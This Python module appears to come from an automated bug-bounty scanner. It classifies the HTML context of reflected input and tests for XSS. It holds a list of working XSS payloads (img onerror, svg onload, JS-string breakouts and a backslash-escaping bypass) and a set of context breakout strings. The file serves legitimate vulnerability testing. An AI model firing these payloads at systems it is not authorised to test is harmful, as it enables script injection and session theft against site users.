"""
XSS detection: context-aware reflection analysis + browser execution proof.

From Bug Bounty Bootcamp (Li, Ch 6). Two layers, matching the chapter's method:

  1. Reflection analysis (pure, unit-tested): inject a canary, find WHERE it
     reflects and in what context (HTML text, single/double-quoted attribute,
     inside <script>, inside a comment), then inject a context-specific breakout
     and check whether the structural characters (< > " ') survive UNescaped.
     That is the real exploitability signal — far better than "the marker
     appeared", which fires on safely-escaped reflections too.

  2. Execution proof (tools._run_xss, headless Chromium via Playwright): load the
     URL with auto-firing payloads and a real dialog handler. If alert() fires,
     the XSS is CONFIRMED. This layer also catches DOM-only XSS (e.g. a hash sink
     via innerHTML) that never appears in the HTTP response at all.

This module holds the pure logic; the transport + browser live in tools.
"""
from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

CANARY = "bbhCanary8842"
MARK = "bbhx7"   # short structural marker embedded in breakout payloads

# Context -> breakout whose LITERAL presence in the response proves the
# structural chars were not escaped in that context.
BREAKOUTS = {
    "html":     f"<{MARK}h>",
    "attr_dq":  f'"><{MARK}a>',
    "attr_sq":  f"'><{MARK}a>",
    "attr_uq":  f" {MARK}u=1",
    "script":   f"</script><{MARK}s>",
    "comment":  f"--><{MARK}c>",
}

# Contexts where a surviving breakout injects a NEW HTML ELEMENT into the
# response — i.e. reflection alone proves executable markup, no browser needed.
# script / comment / attr_uq are deliberately excluded: the breakout there is
# weaker proof (JS-string escaping edge cases, attribute-only injection), so
# they stay candidates for the browser-execution pass to confirm.
EXECUTABLE_ON_REFLECTION = {"html", "attr_dq", "attr_sq"}

# Auto-firing execution payloads for the browser confirmation pass. The alert ARGUMENT is a quote-free
# regex literal `/bbhx7/` (its String() is "/bbhx7/", which carries the MARK the dialog handler matches) —
# NOT alert('bbhx7'). This matters for the JS-STRING context (a value reflected inside a quoted JS string,
# `var x='HERE'`): an app that escapes the breakout quote also escapes any quote INSIDE the payload, so an
# alert('...') is neutralised while alert(/.../ ) survives. Ordered HTML-context first, then JS-string,
# including a leading-backslash variant that neutralises an app that escapes the quote (\') but not the
# backslash — the classic backslash-escaping bypass. General across any reflection, not GinAndJuice-specific.
_A = "/" + MARK + "/"   # quote-free regex-literal alert arg; String(/bbhx7/) contains MARK
EXEC_PAYLOADS = (
    '"><img src=x onerror=alert(' + _A + ')>',
    "'><img src=x onerror=alert(" + _A + ")>",
    '<img src=x onerror=alert(' + _A + ')>',
    '"><svg onload=alert(' + _A + ')>',
    "</script><svg onload=alert(" + _A + ")>",
    "javascript:alert(" + _A + ")",
    # JS-string breakouts (single/double quote; plain + backslash-bypass; concat + statement forms)
    "';alert(" + _A + ")//",
    "\";alert(" + _A + ")//",
    "\\';alert(" + _A + ")//",
    "\\\";alert(" + _A + ")//",
    "'-alert(" + _A + ")-'",
    "\"-alert(" + _A + ")-\"",
)


def set_param(url: str, name: str, value: str) -> str:
    """Set `name` to `value` on `url`. A MISSING parameter is APPENDED, never dropped.

    THE CONTRACT, and it is shared with `ssrf_tool.set_param` and `dom_trace.set_param`; all three
    must agree, and `tests/test_set_param_contract.py` asserts that they do.

    This function used to rewrite only parameters already present, and silently returned the URL
    UNCHANGED for any other name. Every injection engine probes through it -- `_run_sqli`,
    `_run_nosqli`, `_run_cmdi`, `_run_xss` -- and they routinely probe a parameter DISCOVERED rather
    than one already on the URL. For those, the "probe" the engine sent was the baseline itself: the
    differential was zero by construction, and the endpoint was reported clean without ever being
    tested. A false negative shaped exactly like a correct non-detection, which is the worst shape
    there is.
    """
    p = urlparse(url)
    pairs = parse_qsl(p.query, keep_blank_values=True)
    if any(k == name for k, _ in pairs):
        pairs = [(k, value if k == name else v) for k, v in pairs]
    else:
        pairs.append((name, value))
    return urlunparse(p._replace(query=urlencode(pairs, doseq=True)))


def set_fragment(url: str, value: str) -> str:
    return urlunparse(urlparse(url)._replace(fragment=value))


def params_of(url: str) -> list:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def contexts_of(body: str, canary: str = CANARY) -> list:
    """Classify every reflection of `canary` in `body` by HTML context."""
    out, seen = [], set()
    start = 0
    while True:
        idx = body.find(canary, start)
        if idx == -1:
            break
        start = idx + len(canary)
        prefix = body[:idx]
        ctx = _classify(prefix)
        if ctx not in seen:
            seen.add(ctx)
            out.append(ctx)
    return out


def _classify(prefix: str) -> str:
    # inside a <script> block?
    if prefix.rfind("<script") > prefix.rfind("</script"):
        return "script"
    # inside an HTML comment?
    if prefix.rfind("<!--") > prefix.rfind("-->"):
        return "comment"
    # inside a tag (unclosed '<' more recent than the last '>')?
    last_lt, last_gt = prefix.rfind("<"), prefix.rfind(">")
    if last_lt > last_gt:
        seg = prefix[last_lt:]
        if seg.count('"') % 2 == 1:
            return "attr_dq"
        if seg.count("'") % 2 == 1:
            return "attr_sq"
        return "attr_uq"
    return "html"


def _escaped(body: str, i: int) -> bool:
    """True when the char at index i is backslash-escaped (odd run of preceding
    backslashes). A `"` written as `\\"` inside a JS string is NOT a breakout."""
    n, j = 0, i - 1
    while j >= 0 and body[j] == "\\":
        n += 1
        j -= 1
    return n % 2 == 1


def breakout_index(body: str, context: str) -> int:
    """Index where the context's breakout survives as a REAL breakout: present
    literally, NOT backslash-escaped, AND at a position that re-classifies to the
    SAME context. The context re-check rejects cross-context false matches — e.g.
    an attr_dq breakout that only appears inside a <script> JS string (where the
    delimiter is escaped and the true context is `script`). -1 if never real."""
    b = BREAKOUTS.get(context)
    if not b:
        return -1
    body = body or ""
    start = 0
    while True:
        i = body.find(b, start)
        if i == -1:
            return -1
        start = i + 1
        if _escaped(body, i):
            continue                       # escaped delimiter — trapped, not a breakout
        if _classify(body[:i]) != context:
            continue                       # breakout landed in a different context
        return i


def reflected_exploitable(body: str, context: str) -> bool:
    """True when the context's breakout genuinely survives (see breakout_index)."""
    return breakout_index(body, context) != -1


def _evidence_snippet(body: str, idx: int, breakout: str) -> str:
    """A short window around a surviving breakout, for the finding's evidence."""
    if idx < 0:
        return ""
    seg = (body or "")[max(0, idx - 48): idx + len(breakout) + 24]
    return " ".join(seg.split())[:200]


#: Types a browser will parse as MARKUP. Anything else cannot run an injected element, no matter
#: how unescaped the reflection is.
_HTML_TYPES = ("text/html", "application/xhtml")


def markup_executable(content_type: str = "", nosniff: bool = False) -> bool:
    """Can a reflected payload in THIS response run as markup?

    Q-160. `contexts_of` classifies a reflection by looking at the bytes around it and assumes the
    body is HTML -- so a canary echoed into a JSON error body is classified "html", and the finding
    said "Reflected XSS (html) ... confidence=confirmed, severity=high".

    MEASURED on juice-shop `/api/Challenges/?sort=`: the value reflects unescaped, angle brackets
    intact, into `{"message":"Sorting not allowed...","errors":["<canary>"]}` -- served as HTTP 400
    `application/json` with `X-Content-Type-Options: nosniff`. Navigating a real browser there with
    three separate executing payloads fired NO dialog, because the browser never parses it as HTML.

    Every API that echoes a bad parameter into a JSON error was therefore a HIGH.

    Declared HTML wins outright. No content-type at all is sniffable, so it stays executable. A
    non-HTML type with `nosniff` cannot execute. A non-HTML type WITHOUT `nosniff` is left
    executable on purpose -- sniffing behaviour varies by browser and by type, and refusing those
    would trade a false positive for a false negative on the commoner case.
    """
    ct = str(content_type or "").split(";")[0].strip().lower()
    if not ct:
        return True                       # nothing declared -> the browser may sniff it
    if any(ct.startswith(h) for h in _HTML_TYPES):
        return True
    return not nosniff


def reflection_finding(url: str, param: str, context: str, where: str = "query",
                       evidence: str = "", renderable: bool = True) -> dict:
    # A surviving breakout that injects a new element is proof of exploitable
    # markup — but grade it CONFIRMED only WITH real in-context evidence. No
    # evidence => candidate, never confirmed. script / comment / unquoted-attr
    # always stay candidate for the browser-execution pass (or a human).
    # Q-160. A response the browser will not parse as markup cannot execute an injected element,
    # so the reflection is REAL and the XSS claim is not. Downgraded rather than dropped: the
    # unescaped echo is a true observation and worth reporting as one.
    proven = context in EXECUTABLE_ON_REFLECTION and bool(evidence) and renderable
    label = "confirmed" if proven else "candidate"
    finding = {
        "title": f"Reflected XSS ({context}) in '{param}'", "param": param,  # Q-046
        "severity": "high", "target": set_param(url, param, BREAKOUTS[context]) if where == "query" else url,
        "description": (f"User input in the {where} parameter '{param}' reflects into a {context} context with the "
                        f"structural characters unescaped (breakout '{BREAKOUTS[context]}' survived literally). "
                        + ("The breakout injects a new HTML element, so this is directly exploitable markup."
                           if proven else "This is injectable HTML/script; execution needs browser/manual confirmation.")),
        "impact": "Execute script in victims' browsers: session/CSRF-token theft, account takeover, page defacement.",
        "reproduction_steps": [f"Set '{param}' to {BREAKOUTS[context]}",
                               "Observe it reflected unescaped in the response",
                               "Replace with an executing payload (e.g. \"><img src=x onerror=alert(1)>)"],
        "evidence": evidence,
        "cwe": "CWE-79", "family": "xss", "tags": ["xss"], "confidence": label,
    }
    if not renderable:
        finding["severity"] = "informational"
        finding["confidence"] = "lead"
        finding["title"] = f"Unescaped reflection in '{param}' (response is not parsed as HTML)"
        finding["description"] = (
            f"The {where} parameter '{param}' reflects with structural characters unescaped, but the "
            "response is not served as a markup type and cannot be sniffed into one, so a browser "
            "never parses it as HTML and an injected element cannot execute. Reported as an "
            "encoding observation, NOT as XSS. It becomes exploitable only if this same value is "
            "later rendered into an HTML response, which is a separate finding about that sink.")
        finding["impact"] = ("None on its own. Worth fixing because the value is stored/echoed "
                             "unencoded and a future HTML sink would make it executable.")
    if proven:
        finding["negative_controls"] = [{
            "kind": "harmless-reflection-canary",
            "payload": CANARY,
            "result": "the canary located the response context without introducing the breakout element",
        }]
    return finding


def execution_finding(url: str, param: str, payload: str, where: str) -> dict:
    tgt = set_fragment(url, payload) if where == "fragment" else set_param(url, param, payload)
    return {
        "title": f"XSS confirmed ({'DOM/fragment' if where == 'fragment' else where} '{param}')",
        "severity": "critical", "target": tgt,
        "description": (f"A payload injected via the {where} executed in a real headless browser (alert fired). "
                        + ("DOM-based sink — the payload never reached the server." if where == "fragment"
                           else "The reflected payload executed on load.")),
        "impact": "Arbitrary script execution in victims' browsers: session/CSRF-token theft, account takeover.",
        "reproduction_steps": [f"Load {tgt}", "Observe alert() fire (script executed)"],
        "evidence": f"payload={payload}", "cwe": "CWE-79", "family": "xss",
        "tags": ["xss"], "confidence": "confirmed",
    }
